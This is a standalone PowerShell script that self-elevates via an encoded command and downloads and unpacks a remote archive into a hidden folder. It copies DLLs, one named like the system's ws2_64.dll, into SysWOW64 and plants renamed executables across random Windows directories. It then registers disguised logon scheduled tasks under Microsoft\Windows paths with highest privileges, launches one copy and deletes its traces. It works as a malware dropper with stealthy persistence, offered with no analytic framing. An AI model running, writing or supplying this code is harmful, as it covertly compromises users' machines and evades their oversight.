$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-NOT $isAdmin) {
    $code = $MyInvocation.MyCommand.ScriptBlock.ToString()

    if ([string]::IsNullOrWhiteSpace($code)) {
        Write-Error "Can not restart"
        exit 1
    }

    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
    Start-Process powershell -Verb RunAs -ArgumentList `
        "-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",$encoded
    exit
}

Write-Host "Starting..." -ForegroundColor Green

$scriptRoot = $PSScriptRoot
if (-not $scriptRoot) {
    $cmdPath = $MyInvocation.MyCommand.Path
    if ($cmdPath) {
        $scriptRoot = Split-Path -Parent $cmdPath
    }
}
if (-not $scriptRoot) {
    $scriptRoot = (Get-Location).Path
    Write-Warning "Could not determine script directory. Using: $scriptRoot"
}

$hiddenDirPath = Join-Path $env:LOCALAPPDATA 'ViaCache'

if (-not (Test-Path -Path $hiddenDirPath)) {
    New-Item -ItemType Directory -Path $hiddenDirPath -Force | Out-Null
}
Set-ItemProperty -Path $hiddenDirPath -Name Attributes `
    -Value ([System.IO.FileAttributes]::Hidden)

Set-Location -Path $hiddenDirPath
Write-Host "Working directory: $(Get-Location)" -ForegroundColor Cyan

$version  = "v2.4"
$zipUrl   = "https://github.com/ScavyXYZ/Via/releases/download/$version/Via.zip"
$zipName  = "Via.zip"

$downloadOk = $false

Write-Host "Downloading $zipName ..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipName -ErrorAction Stop
    Write-Host "Download complete." -ForegroundColor Green
    $downloadOk = $true
}
catch {
    Write-Error "Failed to download $zipName. Error: $_"
    Write-Host "Press Enter to continue without the downloaded file..." -ForegroundColor DarkYellow
    Read-Host
}

if ($downloadOk -and (Test-Path $zipName)) {
    Write-Host "Extracting '$zipName' ..." -ForegroundColor Cyan
    try {
        Expand-Archive -Path $zipName -DestinationPath "." -Force -ErrorAction Stop
        Write-Host "Extraction complete." -ForegroundColor Green
    }
    catch {
        Write-Error "Failed to extract archive. Error: $_"
        Write-Host "Press Enter to continue..." -ForegroundColor DarkYellow
        Read-Host
    }

    Write-Host "Removing $zipName ..." -ForegroundColor Cyan
    try {
        Remove-Item -Path $zipName -Force -ErrorAction Stop
        Write-Host "Cleaned up $zipName." -ForegroundColor Green
    }
    catch {
        Write-Warning "Could not delete $zipName. Error: $_"
    }
}
else {
    Write-Warning "Skipping extraction (download failed or file not found)."
}

$exeName         = "MPcrash.exe"
$exeInDirectory  = "CrashTask.exe"
$dllNames        = @("winrsi.dll", "ws2_64.dll")
$sysWow64        = Join-Path $env:WINDIR "SysWOW64"

if (-not (Test-Path $sysWow64)) {
    Write-Error "SysWOW64 not found: $sysWow64"
    Read-Host "Press Enter to exit"
    return
}

foreach ($dll in $dllNames) {
    $src = Join-Path (Get-Location) $dll
    $dst = Join-Path $sysWow64 $dll

    if (-not (Test-Path $src)) {
        Write-Warning "DLL not found: $src"
        continue
    }

    try {
        Copy-Item -Path $src -Destination $dst -Force -ErrorAction Stop
        Write-Host "DLL COPIED -> $dst" -ForegroundColor Green
    }
    catch {
        Write-Host "DLL FAIL   -> $dst : $($_.Exception.Message)" -ForegroundColor Red
    }
}

$paths = Get-ScheduledTask |
    Where-Object {
        $_.TaskPath -like '\Microsoft\Windows\*' -and
        $_.Actions.CimClass.CimClassName -contains 'MSFT_TaskExecAction'
    } |
    Select-Object -ExpandProperty TaskPath -Unique

$task_names = $paths | ForEach-Object {
    "$(($_ -split '\\')[-2]) CrashTask"
}

$root  = 'C:\Windows'
$depth = 3

$allFolders = Get-ChildItem -Path $root -Directory -Recurse -ErrorAction SilentlyContinue |
    Where-Object {
        $relative = $_.FullName.Substring($root.Length).Trim('\')
        ($relative -split '\\').Count -eq $depth
    }

$count    = $task_names.Count
$selected = $allFolders |
    Select-Object -ExpandProperty FullName |
    Get-Random -Count ([Math]::Min($count, ($allFolders | Measure-Object).Count))

$exePath = Join-Path (Get-Location) $exeName

if (-not (Test-Path $exePath)) {
    Write-Host "Error: File $exePath not found!" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    return
}

Write-Host "Source exe: $exePath" -ForegroundColor Green

$copied = @()

foreach ($folder in $selected) {
    $dest = Join-Path $folder $exeInDirectory
    try {
        Copy-Item -Path $exePath -Destination $dest -Force -ErrorAction Stop
        $copied += $dest
        Write-Host "EXE COPIED -> $dest" -ForegroundColor Green
    }
    catch {
        Write-Host "EXE FAIL   -> $dest : $($_.Exception.Message)" -ForegroundColor Red
    }
}

$pairCount = [Math]::Min($paths.Count, $copied.Count)

if ($pairCount -lt $paths.Count) {
    Write-Warning "Only $pairCount tasks will be created (paths=$($paths.Count), copied=$($copied.Count))."
}

for ($i = 0; $i -lt $pairCount; $i++) {
    $taskPath   = $paths[$i]
    $taskName   = $task_names[$i]
    $exeForTask = $copied[$i]

    $fullTaskName = "$taskPath$taskName"

    if (Get-ScheduledTask -TaskName $taskName -TaskPath $taskPath -ErrorAction SilentlyContinue) {
        Write-Host "SKIP (exists) -> $fullTaskName" -ForegroundColor DarkYellow
        continue
    }

    Write-Host "`nCreating task '$taskName' in '$taskPath' -> $exeForTask" -ForegroundColor Yellow

    schtasks /create `
        /tn "$fullTaskName" `
        /tr "`"$exeForTask`"" `
        /sc onlogon `
        /rl highest `
        /f

    if ($LASTEXITCODE -eq 0) {
        Write-Host "TASK OK   -> $fullTaskName" -ForegroundColor Green
    }
    else {
        Write-Host "TASK FAIL -> $fullTaskName" -ForegroundColor Red
    }
}

if (Test-Path $exePath) {
    Write-Host "Removing original $exeName ..." -ForegroundColor Cyan
    try {
        Remove-Item -Path $exePath -Force -ErrorAction Stop
        Write-Host "Removed $exePath" -ForegroundColor Green
    }
    catch {
        Write-Warning "Could not delete $exePath. Error: $_"
    }
}
else {
    Write-Warning "$exeName already gone: $exePath"
}

if ($copied.Count -gt 0) {
    $launchExe = $copied | Get-Random

    if (Test-Path $launchExe) {
        Write-Host "`nLaunching copy: $launchExe" -ForegroundColor Cyan
        try {
            Start-Process -FilePath $launchExe -ErrorAction Stop
            Write-Host "Started $launchExe" -ForegroundColor Green
        }
        catch {
            Write-Error "Failed to start $launchExe. Error: $_"
            Write-Host "Press Enter to continue..." -ForegroundColor DarkYellow
            Read-Host
        }
    }
    else {
        Write-Warning "Copy not found: $launchExe"
    }
}
else {
    Write-Warning "No copies available to launch."
}

# === ВИДАЛЕННЯ ПАПКИ ViaCache ===
Set-Location -Path $env:LOCALAPPDATA
Write-Host "`nRemoving ViaCache directory..." -ForegroundColor Cyan
try {
    if (Test-Path $hiddenDirPath) {
        Remove-Item -Path $hiddenDirPath -Recurse -Force -ErrorAction Stop
        Write-Host "ViaCache removed: $hiddenDirPath" -ForegroundColor Green
    }
    else {
        Write-Warning "ViaCache not found: $hiddenDirPath"
    }
}
catch {
    Write-Warning "Could not delete ViaCache. Error: $_"
}

Write-Host "`nAll done. Press Enter to close." -ForegroundColor Cyan
Read-Host
